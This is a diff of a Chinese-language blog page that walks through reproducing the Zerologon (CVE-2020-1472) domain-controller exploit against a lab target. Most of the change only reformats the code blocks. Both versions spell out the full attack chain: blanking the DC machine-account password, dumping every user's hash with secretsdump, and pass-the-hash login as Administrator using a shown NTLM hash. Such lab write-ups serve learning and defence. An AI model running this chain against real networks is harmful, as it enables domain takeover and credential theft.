@@ -25,7 +25,7 @@
 <meta property="og:image" content="http://klforever.cn/images/14/5.png">
 <meta property="og:image" content="http://klforever.cn/images/14/6.png">
 <meta property="og:image" content="http://klforever.cn/images/14/7.png">
-<meta property="og:updated_time" content="2021-04-25T07:34:49.242Z">
+<meta property="og:updated_time" content="2021-04-25T09:03:55.627Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="域内提权CVE-2020-1472">
 <meta name="twitter:description" content="CVE-2020-1472 2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程">
@@ -52,14 +52,15 @@
 
   
     
- 	  <script src="/lib/clickLove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+ 	  <script src="/lib/clickLove.js"></script>
   
   
 
 
   
 
-</head>
+<link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 <body>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
@@ -249,25 +250,31 @@
     <h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><blockquote>
 <p>2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。<br>攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。<br>对此，360CERT建议广大用户及时为各Windows Server操作系统安装最新相关补丁。与此同时，请做好资产自查以及预防工作，以免遭受黑客攻击。</p>
 </blockquote>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>Windows Server 2008 R2 for x64-based Systems Service Pack 1
-Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
-Windows Server 2012
-Windows Server 2012 (Server Core installation)
-Windows Server 2012 R2
-Windows Server 2012 R2 (Server Core installation)
-Windows Server 2016
-Windows Server 2016 (Server Core installation)
-Windows Server 2019
-Windows Server 2019 (Server Core installation)
-Windows Server, version 1903 (Server Core installation)
-Windows Server, version 1909 (Server Core installation)
-Windows Server, version 2004 (Server Core installation)</code></pre><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>EXP：<br><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/SecuraBV/CVE-2020-1472/" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472/</a></p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre class="line-numbers language-python"><code class="language-python">Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span>
+Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
+Windows Server <span class="token number">2012</span>
+Windows Server <span class="token number">2012</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
+Windows Server <span class="token number">2012</span> R2
+Windows Server <span class="token number">2012</span> R2 <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
+Windows Server <span class="token number">2016</span>
+Windows Server <span class="token number">2016</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
+Windows Server <span class="token number">2019</span>
+Windows Server <span class="token number">2019</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
+Windows Server<span class="token punctuation">,</span> version <span class="token number">1903</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
+Windows Server<span class="token punctuation">,</span> version <span class="token number">1909</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
+Windows Server<span class="token punctuation">,</span> version <span class="token number">2004</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>EXP：<br><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/SecuraBV/CVE-2020-1472/" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472/</a></p>
 <p>靶机ip：192.168.21.109 （win server 2012 r2）</p>
-<h3 id="首先在进入内网环境下获取到域控服务器的NetBIOS名称"><a href="#首先在进入内网环境下获取到域控服务器的NetBIOS名称" class="headerlink" title="首先在进入内网环境下获取到域控服务器的NetBIOS名称"></a>首先在进入内网环境下获取到域控服务器的NetBIOS名称</h3><pre><code>nbtstat -A DC_IP</code></pre><p><img src="/images/14/1.png" alt></p>
-<h3 id="检测目标是否能够利用此漏洞"><a href="#检测目标是否能够利用此漏洞" class="headerlink" title="检测目标是否能够利用此漏洞"></a>检测目标是否能够利用此漏洞</h3><pre><code>python .\zerologon_tester.py DC 192.168.21.109</code></pre><p><img src="/images/14/2.png" alt></p>
-<h3 id="将域控服务器中的机器账户密码打空"><a href="#将域控服务器中的机器账户密码打空" class="headerlink" title="将域控服务器中的机器账户密码打空"></a>将域控服务器中的机器账户密码打空</h3><pre><code>python .\cve-2020-1472-exploit.py DC 192.168.21.109</code></pre><p><img src="/images/14/3.png" alt></p>
-<h3 id="获取目标机器中所有用户的hash"><a href="#获取目标机器中所有用户的hash" class="headerlink" title="获取目标机器中所有用户的hash"></a>获取目标机器中所有用户的hash</h3><pre><code>python .\secretsdump.py de1ay.com/DC$@192.168.21.109 -no-pass</code></pre><p><img src="/images/14/4.png" alt></p>
-<h3 id="使用Administrator用户登陆de1ay域"><a href="#使用Administrator用户登陆de1ay域" class="headerlink" title="使用Administrator用户登陆de1ay域"></a>使用Administrator用户登陆de1ay域</h3><pre><code>python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 de1ay.com/Administrator@192.168.21.109</code></pre><p><img src="/images/14/5.png" alt></p>
+<h3 id="首先在进入内网环境下获取到域控服务器的NetBIOS名称"><a href="#首先在进入内网环境下获取到域控服务器的NetBIOS名称" class="headerlink" title="首先在进入内网环境下获取到域控服务器的NetBIOS名称"></a>首先在进入内网环境下获取到域控服务器的NetBIOS名称</h3><pre class="line-numbers language-python"><code class="language-python">nbtstat <span class="token operator">-</span>A DC_IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/14/1.png" alt></p>
+<h3 id="检测目标是否能够利用此漏洞"><a href="#检测目标是否能够利用此漏洞" class="headerlink" title="检测目标是否能够利用此漏洞"></a>检测目标是否能够利用此漏洞</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\zerologon_tester<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/14/2.png" alt></p>
+<h3 id="将域控服务器中的机器账户密码打空"><a href="#将域控服务器中的机器账户密码打空" class="headerlink" title="将域控服务器中的机器账户密码打空"></a>将域控服务器中的机器账户密码打空</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\cve<span class="token number">-2020</span><span class="token operator">-</span><span class="token number">1472</span><span class="token operator">-</span>exploit<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/14/3.png" alt></p>
+<h3 id="获取目标机器中所有用户的hash"><a href="#获取目标机器中所有用户的hash" class="headerlink" title="获取目标机器中所有用户的hash"></a>获取目标机器中所有用户的hash</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\secretsdump<span class="token punctuation">.</span>py de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>DC$@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span> <span class="token operator">-</span>no<span class="token operator">-</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/14/4.png" alt></p>
+<h3 id="使用Administrator用户登陆de1ay域"><a href="#使用Administrator用户登陆de1ay域" class="headerlink" title="使用Administrator用户登陆de1ay域"></a>使用Administrator用户登陆de1ay域</h3><pre class="line-numbers language-python"><code class="language-python">python wmiexec<span class="token punctuation">.</span>py <span class="token operator">-</span>hashes aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span><span class="token number">161cff084477fe596a5db81874498a24</span> de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>Administrator@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/14/5.png" alt></p>
 <p>这个Hash也可解出来<br><img src="/images/14/6.png" alt><br><img src="/images/14/7.png" alt><br>后续恢复密码<br><a href="https://www.cnblogs.com/Yang34/p/13678632.html" target="_blank" rel="noopener">https://www.cnblogs.com/Yang34/p/13678632.html</a></p>
 <p>具体原理<br><a href="https://blog.csdn.net/smellycat000/article/details/108633744" target="_blank" rel="noopener">https://blog.csdn.net/smellycat000/article/details/108633744</a></p>
 
